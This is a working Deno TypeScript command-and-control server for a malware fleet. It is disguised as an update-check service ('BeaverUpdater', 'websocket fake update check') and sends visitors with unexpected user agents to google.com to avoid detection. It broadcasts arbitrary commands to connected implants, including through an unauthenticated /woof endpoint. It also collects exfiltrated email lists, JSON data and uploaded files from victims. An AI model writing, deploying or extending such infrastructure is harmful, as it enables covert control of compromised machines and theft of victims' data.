#!/usr/bin/env -S deno run -A
import { Application, Router } from "https://deno.land/x/oak/mod.ts";
import { join } from "https://deno.land/std/path/mod.ts";

const port = 8080;
const app = new Application();
const router = new Router();
const connectedClients = new Map();

const approvedAgents = ["Deno/2.2.7", "BeaverUpdater", "websocket", "Firefox"];

// Function to log messages to a file
async function logToFile(message: string) {
  const logFilePath = "/web/server.log"; // /web/server.log
  try {
      await Deno.writeTextFile(logFilePath, message + "\n", { append: true }); // Append the message to the log file
  } catch (error) {
      console.error("Failed to write to log file:", error);
  }
}

// Save the original console.log
const originalConsoleLog = console.log;

// Replace console.log with a custom function
console.log = (...args: any[]) => {
  const message = args.map(arg => String(arg)).join(" "); // Convert all arguments to strings and join them
  logToFile(message); // Write the message to the log file
  originalConsoleLog(...args); // Optionally, still call the original console.log for debugging or other purposes
};

// send a message to all connected clients
function broadcast(command:string) {
  console.log(`Sending ${command} command to all connected clients.`);
  for (const client of connectedClients.values()) {
    client.send(
      JSON.stringify({
        event: "command",
        message: command
      }),
    );
  }
}

function handle_json_list(client: string, event: string, jsonStr: string) {
  console.log(`--- ${event} event from ${client} ---`);
  const jsonData = JSON.parse(jsonStr);
  for (const item of jsonData) {
    for (const [key, value] of Object.entries(item)) {
      console.log(`${key}: ${value}`);
    }
    console.log("\r");
  }
}

function handle_json(client: string, event: string, jsonStr: string) {
  console.log(`--- ${event} event from ${client} ---`);
  const jsonData = JSON.parse(jsonStr);
  console.log(jsonData);
}

// websocket fake update check
router.get("/checkupdate", async (ctx) => {
  
  const client = ctx.request.url.searchParams.get("client") || "anon";
  const source_ip = ctx.request.ip;
  const user_agent = ctx.request.headers.get("user-agent") || "websocket";
  const headers = [...ctx.request.headers.entries()];
  
  // re-route jackholes
  // TODO: check headers for actual sec-websocket-version
  if (!approvedAgents.some(agent => user_agent.includes(agent))) {
    console.log(`
      Jackhole detected from:
      IP: ${source_ip}
      User-Agent: ${user_agent}
      Headers: ${headers}
        `);
    return ctx.response.redirect("https://www.google.com/");
  }

  // start socket upgrade and handling
  const socket = await ctx.upgrade();
  if (connectedClients.has(client)) {
    socket.close(1008, `Username ${client} is already taken`);
    return;
  }
  connectedClients.set(client, socket);
  console.log(`
New client connected: ${client}
IP: ${source_ip}
User-Agent: ${user_agent}
Headers: ${headers}
  `);


  // new socket connection tasks
  socket.onopen = () => {};

  // client disconnect tasks
  socket.onclose = () => {
    console.log(`Client ${client} disconnected`);
    connectedClients.delete(client);
  };

  // message handler
  socket.onmessage = (m) => {
    try {
      const data = JSON.parse(m.data);
      switch (data.event) {
        case "message":
          console.log(`Client: ${client}, Message: ${data.message}`);
          break;

        case "email":
          handle_json_list(client, "email", data.message);
          break;
        
          case "json":
            handle_json(client, "json", data.message);
          break;
        case "command":
          console.log(`C2: ${client}, Command: ${data.message}`);
          broadcast(data.message);
          break;
        }
    } catch (error) {
      console.log(error);
    }
  };
});

// insert a new route called sync that accepts a file by post request
router.post("/sync", async (ctx) => {
  const source_ip = ctx.request.ip;
  const user_agent = ctx.request.headers.get("user-agent") || "unknown";
  const headers = [...ctx.request.headers.entries()];
  const body = await ctx.request.body.formData();
  console.log(`
    Upload from:
    IP: ${source_ip}
    User-Agent: ${user_agent}
    Headers: ${headers}
  `);
  console.log(body);
  ctx.response.status = 200;
});

// unauthenticated command broadcast to fleet; yolo
router.get("/woof", async (ctx) => {
  const command = ctx.request.url.searchParams.get("cmd") || "bark";
  broadcast(command);
  ctx.response.redirect(ctx.request.headers.get("Referer") || "/");
});

app.use(router.routes());
app.use(router.allowedMethods());
app.use(async (context) => {
  await context.send({
    root: `/web/public`,
    index: "index.html",
  });
});

console.log("Listening at http://localhost:" + port);
await app.listen({ port });